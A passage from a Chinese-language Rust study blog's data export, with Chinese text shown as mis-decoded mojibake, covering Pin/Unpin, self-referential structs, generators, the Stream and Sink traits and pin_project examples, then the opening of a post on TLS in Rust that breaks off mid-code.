&#123;:?&#125;\", data); // è‹¥ä¸æ³¨é‡Šä¸‹é¢è¿™è¡Œï¼Œç¨‹åºè¿è¡Œä¼šç›´æ¥ segment error, move å‰çš„åœ°å€å·²ç»è¢«å›æ”¶ // data.print_name(); print!(\"\\\\n\"); mem_swap_creates_issue();&#125; åˆ›å»ºäº†ä¸€ä¸ªè‡ªå¼•ç”¨ç»“æ„ SelfReferenceï¼Œå®ƒé‡Œé¢çš„ name_ref æŒ‡å‘äº† nameã€‚æ­£å¸¸ä½¿ç”¨å®ƒæ—¶ï¼Œæ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†ä¸€æ—¦å¯¹è¿™ä¸ªç»“æ„åš move æ“ä½œï¼Œname_ref æŒ‡å‘çš„ä½ç½®è¿˜ä¼šæ˜¯ move å‰ name çš„åœ°å€ï¼Œè¿™å°±å¼•å‘äº†é—®é¢˜ã€‚ ä½¿ç”¨ std::mem:swapï¼Œä¹Ÿä¼šå‡ºç°ç±»ä¼¼çš„é—®é¢˜ï¼Œä¸€æ—¦ swapï¼Œä¸¤ä¸ªæ•°æ®çš„å†…å®¹äº¤æ¢ï¼Œç„¶è€Œï¼Œname_ref æŒ‡å‘çš„åœ°å€è¿˜æ˜¯æ—§çš„ã€‚ Pin å¯¹è§£å†³è¿™ç±»é—®é¢˜å¾ˆå…³é”®ï¼Œå¦‚æœè¯•å›¾ç§»åŠ¨è¢« Pin ä½çš„æ•°æ®ç»“æ„ï¼Œè¦ä¹ˆï¼Œç¼–è¯‘å™¨ä¼šé€šè¿‡ç¼–è¯‘é”™è¯¯é˜»æ­¢ä½ ï¼›è¦ä¹ˆï¼Œä½¿ç”¨ unsafe Rustï¼Œè‡ªå·±è´Ÿè´£å…¶å®‰å…¨æ€§ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071use std::&#123;marker::PhantomPinned, pin::Pin&#125;;#[derive(Debug)]struct SelfReference &#123; name: String, // åœ¨åˆå§‹åŒ–åæŒ‡å‘ name name_ptr: *const String, // PhantomPinned å ä½ç¬¦ _marker: PhantomPinned,&#125;impl SelfReference &#123; pub fn new(name: impl Into&lt;String&gt;) -&gt; Self &#123; SelfReference &#123; name: name.into(), name_ptr: std::ptr::null(), _marker: PhantomPinned, &#125; &#125; pub fn init(self: Pin&lt;&amp;mut Self&gt;) &#123; let name_ptr = &amp;self.name as *const String; // SAFETY: è¿™é‡Œå¹¶ä¸ä¼šæŠŠä»»ä½•æ•°æ®ä» &amp;mut SelfReference ä¸­ç§»èµ° let this = unsafe &#123; self.get_unchecked_mut() &#125;; this.name_ptr = name_ptr; &#125; pub fn print_name(self: Pin&lt;&amp;Self&gt;) &#123; println!( \"struct &#123;:p&#125;: (name: &#123;:p&#125; name_ptr: &#123;:p&#125;), name: &#123;&#125;, name_ref: &#123;&#125;\", self, &amp;self.name, self.name_ptr, self.name, // åœ¨ä½¿ç”¨ ptr æ˜¯éœ€è¦ unsafe // SAFETY: å› ä¸ºæ•°æ®ä¸ä¼šç§»åŠ¨ï¼Œæ‰€ä»¥è¿™é‡Œ name_ptr æ˜¯å®‰å…¨çš„ unsafe &#123; &amp;*self.name_ptr &#125;, ); &#125;&#125;fn move_pinned(data: Pin&lt;&amp;mut SelfReference&gt;) &#123; println!(\"&#123;:?&#125; (&#123;:p&#125;)\", data, &amp;data);&#125;#[allow(dead_code)]fn move_it(data: SelfReference) &#123; println!(\"&#123;:?&#125; (&#123;:p&#125;)\", data, &amp;data);&#125;fn move_creates_issue() &#123; let mut data = SelfReference::new(\"Tyr\"); let mut data = unsafe &#123; Pin::new_unchecked(&amp;mut data) &#125;; SelfReference::init(data.as_mut()); // ä¸ moveï¼Œä¸€åˆ‡æ­£å¸¸ data.as_ref().print_name(); // ç°åœ¨åªèƒ½æ‹¿åˆ° pinned åçš„æ•°æ® move_pinned(data.as_mut()); println!(\"&#123;:?&#125; (&#123;:p&#125;)\", data, &amp;data); // æ— æ³•æ‹¿å› Pin ä¹‹å‰çš„ SelfReference ç»“æ„ï¼Œ // expected struct `SelfReference` // found struct `Pin&lt;&amp;mut SelfReference&gt;` // move_it(data);&#125;fn main() &#123; move_creates_issue();&#125; Unpin 1pub auto trait Unpin &#123;&#125; Pin æ˜¯ä¸ºäº†è®©æŸä¸ªæ•°æ®ç»“æ„æ— æ³•åˆæ³•åœ°ç§»åŠ¨ï¼Œè€Œ Unpin åˆ™ç›¸å½“äºå£°æ˜æ•°æ®ç»“æ„æ˜¯å¯ä»¥ç§»åŠ¨çš„ï¼Œå®ƒçš„ä½œç”¨ç±»ä¼¼äº Send / Syncï¼Œé€šè¿‡ç±»å‹çº¦æŸæ¥å‘Šè¯‰ç¼–è¯‘å™¨å“ªäº›è¡Œä¸ºæ˜¯åˆæ³•çš„ã€å“ªäº›ä¸æ˜¯ã€‚ åœ¨ Rust ä¸­ï¼Œç»å¤§å¤šæ•°æ•°æ®ç»“æ„éƒ½æ˜¯å¯ä»¥ç§»åŠ¨çš„ï¼Œæ‰€ä»¥å®ƒä»¬éƒ½è‡ªåŠ¨å®ç°äº† Unpinã€‚ å³ä¾¿è¿™äº›ç»“æ„è¢« Pin åŒ…è£¹ï¼Œå®ƒä»¬ä¾æ—§å¯ä»¥è¿›è¡Œç§»åŠ¨ï¼š 1234567// éœ€è¦ä¸€ä¸ªå¯å˜å¼•ç”¨æ¥è°ƒç”¨ `mem::replace`// å¯ä»¥é€šè¿‡ï¼ˆéšå¼ï¼‰è°ƒç”¨ `Pin::deref_mut` æ¥è·å¾—è¿™æ ·çš„å¼•ç”¨ï¼Œä½†è¿™åªæœ‰åœ¨ `String` å®ç°äº† `Unpin` åæ‰æœ‰å¯èƒ½let mut string = \"this\".to_string();let mut pinned_string = Pin::new(&amp;mut string);mem::replace(&amp;mut *pinned_string, \"other\".to_string()); å½“ä¸å¸Œæœ›ä¸€ä¸ªæ•°æ®ç»“æ„è¢«ç§»åŠ¨ï¼Œå¯ä»¥ä½¿ç”¨ !Unpinã€‚åœ¨ Rust é‡Œï¼Œå®ç°äº† !Unpin çš„ï¼Œé™¤äº†å†…éƒ¨ç»“æ„ï¼ˆæ¯”å¦‚ Futureï¼‰ï¼Œä¸»è¦å°±æ˜¯ PhantomPinnedï¼š 12pub struct PhantomPinned;impl !Unpin for PhantomPinned &#123;&#125; æ‰€ä»¥ï¼Œå¦‚æœä½ å¸Œæœ›ä½ çš„æ•°æ®ç»“æ„ä¸èƒ½è¢«ç§»åŠ¨ï¼Œå¯ä»¥ä¸ºå…¶æ·»åŠ  PhantomPinned å­—æ®µæ¥éšå¼å£°æ˜ !Unpinã€‚ å½“æ•°æ®ç»“æ„æ»¡è¶³ Unpin æ—¶ï¼Œåˆ›å»º Pin ä»¥åŠä½¿ç”¨ Pinï¼ˆä¸»è¦æ˜¯ DerefMutï¼‰éƒ½å¯ä»¥ä¸ä½¿ç”¨ unsafeï¼š 12345678910111213141516171819202122232425262728// å¦‚æœå®ç°äº† Unpinï¼Œå¯ä»¥é€šè¿‡å®‰å…¨æ¥å£åˆ›å»ºå’Œè¿›è¡Œ DerefMutimpl&lt;P: Deref&lt;Target: Unpin&gt;&gt; Pin&lt;P&gt; &#123; pub const fn new(pointer: P) -&gt; Pin&lt;P&gt; &#123; // SAFETY: the value pointed to is `Unpin`, and so has no requirements // around pinning. unsafe &#123; Pin::new_unchecked(pointer) &#125; &#125; pub const fn into_inner(pin: Pin&lt;P&gt;) -&gt; P &#123; pin.pointer &#125;&#125;impl&lt;P: DerefMut&lt;Target: Unpin&gt;&gt; DerefMut for Pin&lt;P&gt; &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut P::Target &#123; Pin::get_mut(Pin::as_mut(self)) &#125;&#125;// å¦‚æœæ²¡æœ‰å®ç° Unpinï¼Œåªèƒ½é€šè¿‡ unsafe æ¥å£åˆ›å»ºï¼Œä¸èƒ½ä½¿ç”¨ DerefMutimpl&lt;P: Deref&gt; Pin&lt;P&gt; &#123; pub const unsafe fn new_unchecked(pointer: P) -&gt; Pin&lt;P&gt; &#123; Pin &#123; pointer &#125; &#125; pub const unsafe fn into_inner_unchecked(pin: Pin&lt;P&gt;) -&gt; P &#123; pin.pointer &#125;&#125; Box é»˜è®¤å®ç°äº† Unpinã€‚ Box åœ¨å †ä¸Šåˆ†é…å†…å­˜ï¼Œè€ŒæŒ‡é’ˆæœ¬èº«æ˜¯å¯ä»¥ç§»åŠ¨çš„ã€‚ Future çš„ç±»å‹ 123456789fn main() &#123; let fut = async &#123; 42 &#125;; println!(\"type of fut is: &#123;&#125;\", get_type_name(&amp;fut));&#125;fn get_type_name&lt;T&gt;(_: &amp;T) -&gt; &amp;'static str &#123; std::any::type_name::&lt;T&gt;()&#125; å®ƒçš„è¾“å‡ºå¦‚ä¸‹ï¼š 1type of fut is: core::future::from_generator::GenFuture&lt;xxx::main::&#123;&#123;closure&#125;&#125;&gt; GenFuture çš„å®šä¹‰: 12345678910struct GenFuture&lt;T: Generator&lt;ResumeTy, Yield = ()&gt;&gt;(T);pub trait Generator&lt;R = ()&gt; &#123; type Yield; type Return; fn resume( self: Pin&lt;&amp;mut Self&gt;, arg: R ) -&gt; GeneratorState&lt;Self::Yield, Self::Return&gt;;&#125; 1234567891011121314151617181920#![feature(generators, generator_trait)]use std::ops::&#123;Generator, GeneratorState&#125;;use std::pin::Pin;fn main() &#123; let mut generator = || &#123; yield 1; return \"foo\" &#125;; match Pin::new(&amp;mut generator).resume(()) &#123; GeneratorState::Yielded(1) =&gt; &#123;&#125; _ =&gt; panic!(\"unexpected return from resume\"), &#125; match Pin::new(&amp;mut generator).resume(()) &#123; GeneratorState::Complete(\"foo\") =&gt; &#123;&#125; _ =&gt; panic!(\"unexpected return from resume\"), &#125;&#125; ç±»ä¼¼ python ä¸­çš„ yieldã€‚ Stream å¯¹äº Iteratorï¼Œå¯ä»¥ä¸æ–­è°ƒç”¨å…¶ next() æ–¹æ³•ï¼Œè·å¾—æ–°çš„å€¼ï¼Œç›´åˆ° Iterator è¿”å› Noneã€‚Iterator æ˜¯é˜»å¡å¼è¿”å›æ•°æ®çš„ï¼Œæ¯æ¬¡è°ƒç”¨ next()ï¼Œå¿…ç„¶ç‹¬å  CPU ç›´åˆ°å¾—åˆ°ä¸€ä¸ªç»“æœï¼Œè€Œå¼‚æ­¥çš„ Stream æ˜¯éé˜»å¡çš„ï¼Œåœ¨ç­‰å¾…çš„è¿‡ç¨‹ä¸­ä¼šç©ºå‡º CPU åšå…¶ä»–äº‹æƒ…ã€‚ Iterator å’Œ Streamçš„æºç å®šä¹‰ï¼ˆå‚è€ƒ Future åº“ï¼‰ï¼š 1234567891011121314151617181920212223pub trait Iterator &#123; type Item; fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;; fn size_hint(&amp;self) -&gt; (usize, Option&lt;usize&gt;) &#123; ... &#125; fn map&lt;B, F&gt;(self, f: F) -&gt; Map&lt;Self, F&gt; where F: FnMut(Self::Item) -&gt; B &#123; ... &#125; ...&#125;pub trait Stream &#123; type Item; // å’Œ Future çš„ poll() æ–¹æ³•å¾ˆåƒï¼Œå’Œ Iterator ç‰ˆæœ¬çš„ next() çš„ä½œç”¨ç±»ä¼¼ fn poll_next(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Option&lt;Self::Item&gt;&gt;; fn size_hint(&amp;self) -&gt; (usize, Option&lt;usize&gt;) &#123; ... &#125;&#125;pub trait StreamExt: Stream &#123; fn next(&amp;mut self) -&gt; Next&lt;'_, Self&gt; where Self: Unpin &#123; ... &#125; fn map&lt;T, F&gt;(self, f: F) -&gt; Map&lt;Self, F&gt; where F: FnMut(Self::Item) -&gt; T &#123; ... &#125; ...&#125; poll_next() è°ƒç”¨èµ·æ¥ä¸æ–¹ä¾¿ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å¤„ç† Poll çŠ¶æ€ï¼Œæ‰€ä»¥ï¼ŒStreamExt æä¾›äº† next() æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªå®ç°äº† Future trait çš„ Next ç»“æ„ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é€šè¿‡ stream.next().await æ¥è·å–ä¸‹ä¸€ä¸ªå€¼äº†ã€‚ 123456789101112131415161718192021222324252627pub trait StreamExt: Stream &#123; fn next(&amp;mut self) -&gt; Next&lt;'_, Self&gt; where Self: Unpin &#123; assert_future::&lt;Option&lt;Self::Item&gt;, _&gt;(Next::new(self)) &#125;&#125;pub struct Next&lt;'a, St: ?Sized&gt; &#123; stream: &amp;'a mut St,&#125;// å¦‚æœ Stream Unpin é‚£ä¹ˆ Next ä¹Ÿæ˜¯ Unpinimpl&lt;St: ?Sized + Unpin&gt; Unpin for Next&lt;'_, St&gt; &#123;&#125;impl&lt;'a, St: ?Sized + Stream + Unpin&gt; Next&lt;'a, St&gt; &#123; pub(super) fn new(stream: &amp;'a mut St) -&gt; Self &#123; Self &#123; stream &#125; &#125;&#125;// Next å®ç°äº† Futureï¼Œæ¯æ¬¡ poll() å®é™…ä¸Šå°±æ˜¯ä» stream ä¸­ poll_next()impl&lt;St: ?Sized + Stream + Unpin&gt; Future for Next&lt;'_, St&gt; &#123; type Output = Option&lt;St::Item&gt;; fn poll(mut self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Self::Output&gt; &#123; self.stream.poll_next_unpin(cx) &#125;&#125; ä¸€èˆ¬æ¥è¯´ï¼Œå¼‚æ­¥æ“ä½œæ•°æ®ç»“æ„ï¼Œå¦‚æœä½¿ç”¨äº†æ³›å‹å‚æ•°ï¼Œåªè¦å†…éƒ¨æ²¡æœ‰è‡ªå¼•ç”¨æ•°æ®ï¼Œå°±åº”è¯¥å®ç° Unpinã€‚ ç¤ºä¾‹ï¼š 123456789101112use futures::prelude::*;#[tokio::main]async fn main() &#123; let mut st = stream::iter(1..10) .filter(|x| future::ready(x % 2 == 0)) .map(|x| x * x); while let Some(x) = st.next().await &#123; println!(\"Got item: &#123;&#125;\", x); &#125;&#125; ä¸€ä¸ª fib Stream ç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859use futures::&#123;prelude::*, stream::poll_fn&#125;;use std::task::Poll;#[tokio::main]async fn main() &#123; consume(fib().take(10)).await; consume(fib1(10)).await; // unfold äº§ç”Ÿçš„ Unfold stream æ²¡æœ‰å®ç° Unpinï¼Œ // å°†å…¶ Pin&lt;Box&lt;T&gt;&gt; ï¼Œä½¿å…¶æ»¡è¶³ consume çš„æ¥å£ consume(fib2(10).boxed()).await;&#125;async fn consume(mut st: impl Stream&lt;Item = i32&gt; + Unpin) &#123; while let Some(v) = st.next().await &#123; print!(\"&#123;&#125; \", v); &#125; print!(\"\\\\n\");&#125;// ä½¿ç”¨ repeat_with åˆ›å»º streamfn fib() -&gt; impl Stream&lt;Item = i32&gt; &#123; let mut a = 1; let mut b = 1; stream::repeat_with(move || &#123; let c = a + b; a = b; b = c; b &#125;)&#125;// ä½¿ç”¨ poll_fn åˆ›å»º streamï¼Œå¯ä»¥é€šè¿‡è¿”å› Poll::Ready(None) æ¥ç»“æŸfn fib1(mut n: usize) -&gt; impl Stream&lt;Item = i32&gt; &#123; let mut a = 1; let mut b = 1; poll_fn(move |_cx| -&gt; Poll&lt;Option&lt;i32&gt;&gt; &#123; if n == 0 &#123; return Poll::Ready(None); &#125; n -= 1; let c = a + b; a = b; b = c; Poll::Ready(Some(b)) &#125;)&#125;fn fib2(n: usize) -&gt; impl Stream&lt;Item = i32&gt; &#123; stream::unfold((n, (1, 1)), |(mut n, (a, b))| async move &#123; if n == 0 &#123; None &#125; else &#123; n -= 1; let c = a + b; // c ä½œä¸º poll_next() çš„è¿”å›å€¼ï¼Œ(n, (a, b)) ä½œä¸º state Some((c, (n, (b, c)))) &#125; &#125;)&#125; å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ unfold çš„æ—¶å€™ï¼ŒåŒæ—¶ä½¿ç”¨äº†å±€éƒ¨å˜é‡å’Œ Futureï¼Œæ‰€ä»¥ç”Ÿæˆçš„ Stream æ²¡æœ‰å®ç° Unpinã€‚ Pin&lt;Box&gt; æ˜¯ä¸€ç§å¾ˆç®€å•çš„æ–¹æ³•ï¼Œèƒ½å°†æ•°æ® Pin åœ¨å †ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ StreamExt çš„ boxed() æ–¹æ³•æ¥ç”Ÿæˆä¸€ä¸ª Pin&lt;Box&gt;ã€‚ pin_project åº“ï¼Œå®ƒæä¾›äº†ä¸€äº›ä¾¿åˆ©çš„å®ï¼Œæ–¹ä¾¿æˆ‘ä»¬æ“ä½œæ•°æ®ç»“æ„é‡Œéœ€è¦è¢« pin ä½çš„å­—æ®µã€‚åœ¨æ•°æ®ç»“æ„ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ #pin æ¥å£°æ˜æŸä¸ªå­—æ®µåœ¨ä½¿ç”¨çš„æ—¶å€™éœ€è¦è¢«å°è£…ä¸º Pinã€‚ Result æ–¹æ³•çš„ transpose å¯ä»¥æ–¹ä¾¿åœ°è¿›è¡Œ Result&lt;Option&gt; å’Œ Option&lt;Result&gt; çš„è½¬åŒ–ã€‚ ç¤ºä¾‹ï¼Œå½“è¯»å–è‡ªå®šä¹‰æ•°æ®ç»“æ„å†…éƒ¨çš„ file å­—æ®µï¼Œä½†åˆä¸æƒ³æŠŠ File æš´éœ²å‡ºæ¥ï¼Œå¯ä»¥å°è£… tokio::fs::File ç»“æ„ï¼Œå¹¶å®ç° AsyncRead traitï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142use anyhow::Result;use pin_project::pin_project;use std::&#123; pin::Pin, task::&#123;Context, Poll&#125;,&#125;;use tokio::&#123; fs::File, io::&#123;AsyncRead, AsyncReadExt, ReadBuf&#125;,&#125;;#[pin_project]struct FileWrapper &#123; #[pin] file: File,&#125;impl FileWrapper &#123; pub async fn try_new(name: &amp;str) -&gt; Result&lt;Self&gt; &#123; let file = File::open(name).await?; Ok(Self &#123; file &#125;) &#125;&#125;impl AsyncRead for FileWrapper &#123; fn poll_read( self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;, buf: &amp;mut ReadBuf&lt;'_&gt;, ) -&gt; Poll&lt;std::io::Result&lt;()&gt;&gt; &#123; self.project().file.poll_read(cx, buf) &#125;&#125;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let mut file = FileWrapper::try_new(\"./Cargo.toml\").await?; let mut buffer = String::new(); file.read_to_string(&amp;mut buffer).await?; println!(\"&#123;&#125;\", buffer); Ok(())&#125; Sink å¼‚æ­¥IOè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒç‹¬ç‰¹çš„ Sink traitï¼Œä¸€ä¸ªç”¨äºå‘é€ä¸€ç³»åˆ—å¼‚æ­¥å€¼çš„æ¥å£ã€‚ Sink trait çš„å®šä¹‰ï¼š 123456789101112131415161718192021222324252627pub trait Sink&lt;Item&gt; &#123; type Error; // ç”¨æ¥å‡†å¤‡ Sink ä½¿å…¶å¯ä»¥å‘é€æ•°æ®ã€‚åªæœ‰ poll_ready() è¿”å› Poll::Ready(Ok(())) åï¼ŒSink æ‰ä¼šå¼€å±•åç»­çš„åŠ¨ä½œ fn poll_ready( self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt; ) -&gt; Poll&lt;Result&lt;(), Self::Error&gt;&gt;; // å¼€å§‹å‘é€æ•°æ®åˆ° Sink // ä½†æ˜¯start_send() å¹¶ä¸ä¿è¯æ•°æ®è¢«å‘é€å®Œæ¯•ï¼Œæ‰€ä»¥è°ƒç”¨è€…è¦è°ƒç”¨ poll_flush() æˆ–è€… poll_close() æ¥ä¿è¯å®Œæ•´å‘é€ fn start_send(self: Pin&lt;&amp;mut Self&gt;, item: Item) -&gt; Result&lt;(), Self::Error&gt;; // å°†ä»»ä½•å°šæœªå‘é€çš„æ•°æ® flush åˆ°è¿™ä¸ª Sink fn poll_flush( self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt; ) -&gt; Poll&lt;Result&lt;(), Self::Error&gt;&gt;; // å°†ä»»ä½•å°šæœªå‘é€çš„æ•°æ® flush åˆ°è¿™ä¸ª Sinkï¼Œå¹¶å…³é—­è¿™ä¸ª Sink fn poll_close( self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt; ) -&gt; Poll&lt;Result&lt;(), Self::Error&gt;&gt;;&#125;pub trait SinkExt&lt;Item&gt;: Sink&lt;Item&gt; &#123; ... fn send(&amp;mut self, item: Item) -&gt; Send&lt;'_, Self, Item&gt; where Self: Unpin &#123; ... &#125; ...&#125; å’Œ Stream trait ä¸åŒçš„æ˜¯ï¼ŒSink trait çš„ Item æ˜¯ trait çš„æ³›å‹å‚æ•°ï¼Œè€Œä¸æ˜¯å…³è”ç±»å‹ã€‚ ä¸€èˆ¬è€Œè¨€ï¼Œå½“ trait æ¥å—æŸä¸ª inputï¼Œåº”è¯¥ä½¿ç”¨æ³›å‹å‚æ•°ï¼Œæ¯”å¦‚ Addï¼›å½“å®ƒè¾“å‡ºæŸä¸ª outputï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨å…³è”ç±»å‹ï¼Œæ¯”å¦‚ Futureã€Streamã€Iterator ç­‰ã€‚ Item å¯¹äº Sink æ¥è¯´æ˜¯è¾“å…¥ï¼Œæ‰€ä»¥ä½¿ç”¨æ³›å‹å‚æ•°ã€‚ ç¤ºä¾‹ï¼Œæ³¨æ„å®ç° pull_xxx æ–¹æ³•æ—¶ï¼Œä¸èƒ½å†ç›´æ¥ä½¿ç”¨å¼‚æ­¥å‡½æ•°ï¼Œéœ€è¦è§†ä¸º future ï¼Œå¹¶è°ƒç”¨ future çš„ poll å‡½æ•°ï¼Œè¿™æ—¶å¯èƒ½ä¼šéœ€è¦ Box::pin ç”Ÿæˆå †ä¸Šçš„ trait objectï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374use anyhow::Result;use bytes::&#123;BufMut, BytesMut&#125;;use futures::&#123;Sink, SinkExt&#125;;use pin_project::pin_project;use std::&#123; pin::Pin, task::&#123;Context, Poll&#125;,&#125;;use tokio::&#123;fs::File, io::AsyncWrite&#125;;#[pin_project]struct FileSink &#123; #[pin] file: File, buf: BytesMut,&#125;impl FileSink &#123; pub fn new(file: File) -&gt; Self &#123; Self &#123; file, buf: BytesMut::new(), &#125; &#125;&#125;impl Sink&lt;&amp;str&gt; for FileSink &#123; type Error = std::io::Error; fn poll_ready(self: Pin&lt;&amp;mut Self&gt;, _cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), Self::Error&gt;&gt; &#123; Poll::Ready(Ok(())) &#125; fn start_send(self: Pin&lt;&amp;mut Self&gt;, item: &amp;str) -&gt; Result&lt;(), Self::Error&gt; &#123; let this = self.project(); eprint!(\"&#123;&#125;\", item); this.buf.put(item.as_bytes()); Ok(()) &#125; fn poll_flush(mut self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), Self::Error&gt;&gt; &#123; // å¦‚æœæƒ³ project() å¤šæ¬¡ï¼Œéœ€è¦å…ˆæŠŠ self reborrow let this = self.as_mut().project(); // è¿™ä¸ª buffer å’Œ self æ— å…³ï¼Œæ‰€ä»¥ä¼ å…¥ poll_write() æ—¶ï¼Œä¸ä¼šæœ‰å¯¹ self çš„å¼•ç”¨é—®é¢˜ let buf = this.buf.split_to(this.buf.len()); if buf.is_empty() &#123; return Poll::Ready(Ok(())); &#125; if let Err(e) = futures::ready!(this.file.poll_write(cx, &amp;buf[..])) &#123; return Poll::Ready(Err(e)); &#125; self.project().file.poll_flush(cx) &#125; fn poll_close(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), Self::Error&gt;&gt; &#123; let this = self.project(); this.file.poll_shutdown(cx) &#125;&#125;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let file_sink = FileSink::new(File::create(\"/tmp/hello\").await?); // pin_mut å¯ä»¥æŠŠå˜é‡ pin ä½ futures::pin_mut!(file_sink); file_sink.send(\"hello\\\\n\").await?; file_sink.send(\"world!\\\\n\").await?; file_sink.send(\"Tyr!\\\\n\").await?; Ok(())&#125; futures é‡Œæä¾›äº† sink::unfold æ–¹æ³•ï¼Œå®ç°åˆ›å»º Sinkï¼Œç±»ä¼¼ stream::unfoldï¼š 1234567891011121314151617181920212223242526use anyhow::Result;use futures::prelude::*;use tokio::&#123;fs::File, io::AsyncWriteExt&#125;;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let file_sink = writer(File::create(\"/tmp/hello\").await?); // pin_mut æŠŠå˜é‡ pin ä½ futures::pin_mut!(file_sink); if let Err(_) = file_sink.send(\"hello\\\\n\").await &#123; println!(\"Error on send\"); &#125; if let Err(_) = file_sink.send(\"world!\\\\n\").await &#123; println!(\"Error on send\"); &#125; Ok(())&#125;/// ä½¿ç”¨ unfold ç”Ÿæˆä¸€ä¸ª Sink æ•°æ®ç»“æ„fn writer&lt;'a&gt;(file: File) -&gt; impl Sink&lt;&amp;'a str&gt; &#123; sink::unfold(file, |mut file, line: &amp;'a str| async move &#123; file.write_all(line.as_bytes()).await?; eprint!(\"Received: &#123;&#125;\", line); Ok::&lt;_, std::io::Error&gt;(file) &#125;)&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"Rust-TLS","slug":"Rust-TLS","date":"2024-11-16T06:52:18.939Z","updated":"2025-02-18T03:09:05.733Z","comments":true,"path":"posts/dad61cf6.html","link":"","permalink":"https://racleray.github.io/posts/dad61cf6.html","excerpt":"Rust TLS notes","text":"ä¸€èˆ¬ Web å¼€å‘ä¸­ï¼Œç±»ä¼¼ MySQLï¼ŒHTTP ç­‰åŸºäº TCP çš„åè®®ï¼Œä¼šæœ‰ TLS åŠ å¯†çš„éœ€è¦ã€‚ä¸€ä¸ªç½‘ç»œåº”ç”¨ï¼Œå³ä¾¿æ˜¯åœ¨å†…ç½‘ä½¿ç”¨ï¼Œå¦‚æœæ²¡æœ‰å®‰å…¨åè®®æ¥ä¿æŠ¤ï¼Œéƒ½æ˜¯å¾ˆå±é™©çš„ã€‚ TLS æ˜¯ä¼ è¾“å±‚å®‰å…¨åè®®ï¼Œå…¨ç§° Transport Layer Securityã€‚TLS çš„å‰èº«æ˜¯ SSLã€‚TLS è¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒ TLS RFC æ–‡æ¡£ã€‚ TLS æ¡æ‰‹è¿‡ç¨‹ï¼š å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ª ClientHello æ¶ˆæ¯ï¼Œæ¶ˆæ¯ä¸­åŒ…å«å®¢æˆ·ç«¯æ”¯æŒçš„åè®®ç‰ˆæœ¬ã€åŠ å¯†å¥—ä»¶ã€å‹ç¼©ç®—æ³•ç­‰ã€‚ æœåŠ¡å™¨æ”¶åˆ° ClientHello æ¶ˆæ¯åï¼Œä¼šè¿”å›ä¸€ä¸ª ServerHello æ¶ˆæ¯ï¼Œæ¶ˆæ¯ä¸­åŒ…å«æœåŠ¡å™¨é€‰æ‹©çš„åè®®ç‰ˆæœ¬ã€åŠ å¯†å¥—ä»¶ã€å‹ç¼©ç®—æ³•ç­‰ã€‚ æœåŠ¡å™¨å‘é€ Certificate æ¶ˆæ¯ï¼Œæ¶ˆæ¯ä¸­åŒ…å«æœåŠ¡å™¨çš„æ•°å­—è¯ä¹¦ã€‚ æœåŠ¡å™¨å‘é€ ServerKeyExchange æ¶ˆæ¯ï¼Œæ¶ˆæ¯ä¸­åŒ…å«æœåŠ¡å™¨ç”Ÿæˆçš„å¯†é’¥äº¤æ¢æ•°æ®ã€‚ æœåŠ¡å™¨å‘é€ ServerHelloDone æ¶ˆæ¯ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å·²ç»å‘é€å®Œæ¯•ã€‚ å‚è€ƒ Wiki TLS ä»¥åŠ Full TLS 1.3 Handshakeã€‚ åœ¨æ•°æ®å¸§ä¸­ï¼ŒTCP payload ä¸­ä¼šåŒ…å« TLS æ•°æ®å¸§ã€‚ã€‚ Rust TLS Rust å¯¹ openssl æœ‰å¾ˆä¸é”™çš„å°è£…ï¼Œä¹Ÿæœ‰ä¸ä¾èµ– openssl ç”¨ Rust æ’°å†™çš„ rustlsã€‚tokio è¿›ä¸€æ­¥æä¾›äº†ç¬¦åˆ tokio ç”Ÿæ€åœˆçš„ tls æ”¯æŒï¼Œæœ‰ openssl ç‰ˆæœ¬å’Œ rustls ç‰ˆæœ¬å¯é€‰ã€‚ Rust tokio-tls ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148use std::io::Cursor;use std::sync::Arc;use tokio::io::&#123;AsyncRead, AsyncWrite&#125;;use tokio_rustls::rustls::&#123;internal::pemfile, Certificate, 